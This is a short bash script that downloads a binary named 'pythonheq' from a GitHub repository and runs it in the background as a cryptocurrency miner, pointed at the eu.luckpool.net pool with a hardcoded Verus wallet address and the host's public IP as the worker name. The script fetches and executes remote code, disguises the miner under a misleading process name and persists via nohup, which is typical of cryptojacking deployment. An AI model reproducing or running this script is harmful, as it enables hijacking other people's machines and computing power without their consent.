#!bin/bash -xe 

echo '#### Version 0.0.1 ####'
if [ $(ps -aux |grep pythonheq |wc -l) -le 1 ]
then 
echo "No process,let's start -> $(ps -aux |grep pythonheq |wc -l)"
# info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl -s ipinfo.io

# Cleaner
rm -rf pythonheq




# Prepare
PoolHost=eu.luckpool.net
Port=3956
PublicVerusCoinAddress="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
WorkerName=$(curl -s https://ipecho.net/plain)
Threads=8



wget -q https://github.com/one10001/10001code/raw/main/pythonheq
chmod +x pythonheq


  echo '######### execution #########'


nohup ./pythonheq -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@" 1> oout 2> oout &
tail -f oout


else 

echo "It's ok : $(ps -aux |grep pythonheq |wc -l)"; 
  tail -f oout
fi
